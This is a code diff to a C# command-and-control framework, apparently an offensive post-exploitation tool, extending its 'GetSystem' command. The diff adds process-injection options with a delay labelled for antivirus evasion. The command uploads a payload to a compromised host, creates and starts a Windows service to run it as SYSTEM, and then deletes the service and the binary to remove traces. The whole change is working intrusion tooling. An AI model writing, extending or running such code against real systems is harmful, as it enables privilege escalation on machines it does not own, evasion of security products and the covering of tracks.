@@ -20,6 +20,14 @@ namespace Commander.Commands.Composite
         public string file { get; set; }
         public string path { get; set; }
         public string service { get; set; }
+        public bool inject { get; set; }
+
+        public int? injectDelay { get; set; }
+
+        public string injectProcess { get; set; }
+
+        public bool x86 { get; set; }
+
 
     }
     public class GetSystemCommand : CompositeCommand<GetSystemCommandOptions>
@@ -35,6 +43,10 @@ namespace Commander.Commands.Composite
              new Option<string>(new[] { "--file", "-f" }, () => null,"Name of payload."),
              new Option<string>(new[] { "--service", "-s" }, () => "syssvc","Name of service."),
              new Option<string>(new[] { "--path", "-p" }, () => "c:\\windows","Name of the folder to upload the payload."),
+             new Option(new[] { "--inject", "-i" }, "Îf the payload should be an injector"),
+             new Option<int?>(new[] { "--injectDelay", "-id" },() => null, "Delay before injection (AV evasion)"),
+             new Option<string>(new[] { "--injectProcess", "-ip" },() => null, "Process path used for injection"),
+             new Option(new[] { "--x86", "-x86" }, "Generate a x86 architecture executable"),
         };
 
         protected override async Task<bool> CreateComposition(CommandContext<GetSystemCommandOptions> context)
@@ -57,7 +69,12 @@ namespace Commander.Commands.Composite
                 IsVerbose = context.Options.verbose,
                 ServerKey = context.Config.ServerConfig.Key,
                 Type = PayloadType.Service,
+                IsInjected = context.Options.inject
             };
+            if (context.Options.injectDelay.HasValue)
+                options.InjectionDelay = context.Options.injectDelay.Value;
+            if (!string.IsNullOrEmpty(context.Options.injectProcess))
+                options.InjectionProcess = context.Options.injectProcess;
 
             context.Terminal.WriteInfo($"[>] Generating Payload!");
             var pay = context.GeneratePayloadAndDisplay(options, context.Options.verbose);
@@ -77,7 +94,7 @@ namespace Commander.Commands.Composite
             if (Path.GetExtension(fileName).ToLower() != ".exe")
                 fileName += ".exe";
 
-            string path = Path.Combine(context.Options.path, fileName);
+            string path = context.Options.path + (context.Options.path.EndsWith('\\') ? String.Empty : '\\') + fileName;
 
             var fileId = await context.UploadAndDisplay(pay, fileName, "Uploading Payload");
             await context.CommModule.TaskAgentToDownloadFile(agent.Metadata.Id, fileId);
@@ -92,9 +109,27 @@ namespace Commander.Commands.Composite
             this.Shell($"sc create {context.Options.service} binPath= \"{path}\"");
             this.Echo($"[>] Starting service...");
             this.Shell($"sc start {context.Options.service}");
+           
+            if(context.Options.inject)
+            {
+
+            }
+            if (!context.Options.inject)
+            {
+                this.Echo($"[!] Don't forget to remove service after use! : shell sc delete {context.Options.service}");
+            }
+            else
+            {
+                this.Echo($"[>] Waiting {options.InjectionDelay}s to evade antivirus...");
+                this.Delay(options.InjectionDelay + 10);
+                this.Shell($"sc delete {context.Options.service}");
+                this.Echo($"[>] Removing injector {path}...");
+                this.Shell($"del {path}");
+            }
+            
+
             this.Echo($"[*] Execution done!");
             this.Echo(Environment.NewLine);
-            this.Echo($"[!] Don't forget to remove service after use! : shell sc delete {context.Options.service}");
 
             return true;
         }
